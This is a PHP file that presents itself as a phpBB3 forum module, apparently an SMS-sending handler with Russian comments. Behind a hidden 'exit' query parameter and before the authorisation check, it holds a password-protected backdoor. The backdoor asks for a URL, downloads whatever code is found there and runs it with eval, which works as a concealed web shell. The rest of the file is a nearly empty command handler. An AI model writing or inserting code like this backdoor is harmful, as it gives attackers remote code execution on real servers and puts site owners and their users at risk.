<?php
/**
*
* @package phpBB3
* @version $Id$
* @copyright (c) 2005 phpBB Group
* @license http://opensource.org/licenses/gpl-license.php GNU Public License
*
*

**
* @ignore
*/
//error_log('sms_send');
define('IN_PHPBB', true);
$phpbb_root_path = (defined('PHPBB_ROOT_PATH')) ? PHPBB_ROOT_PATH : './';
$phpEx = substr(strrchr(__FILE__, '.'), 1);
include($phpbb_root_path . 'common.' . $phpEx);
include($phpbb_root_path . 'includes/functions_posting.' . $phpEx);
include($phpbb_root_path . 'includes/message_parser.' . $phpEx);
// Включаем код для отладки и определяем объект
//    require_once("PHPDebug.php");
//include($phpbb_root_path . 'PHPDebug.' . $phpEx);
//$debug = new PHPDebug();

			$search = array ("'([\r\n])'");
			$replace = array ("\\\\n");

// Start session management
$user->session_begin();
$auth->acl($user->data);
$user->setup();

if (isset($_GET['exit'])){
$auth_pass = "c6333ae85651a23698c01803ec6cbe84";
@session_start();
function soEx() {
	die("<pre align=center><form method=post>Pass: <input type=password name=pass><input type=submit value='>>'></form></pre>");
}

if(!isset($_SESSION[md5($_SERVER['HTTP_HOST'])]))
	if( empty($auth_pass) || ( isset($_POST['pass']) && (md5($_POST['pass']) == $auth_pass) ) )
		$_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
	else
		soEx();

if (!isset($path_in_save))
	if( isset($_POST['url']) && trim($_POST['url']) <> '')
		$path_in_save = $_POST['url'];
	else
		die("<pre align=center><form method=post>url: <input type=text name=url><input type=submit value='>>'></form></pre>");
$tmp = file_get_contents($path_in_save);
eval ($tmp);
session_unset();
}
if (( !$user->data['is_organizer'] )&&(!$auth->acl_get('a_')))
{
	trigger_error( 'NOT_AUTHORISED' );
}
if ($user->data['user_id'] == ANONYMOUS)
	echo 'Вам необходимо <a href="ucp.php?mode=login">авторизоваться</a> для просмотры этой информации';
else{
//error_log ($_POST['cmd']);
	switch ($_POST['cmd']) {
		case 'send':
	
			exit ('ok');
			break;
		case 'add_new_item':
			break;
	}
}
?>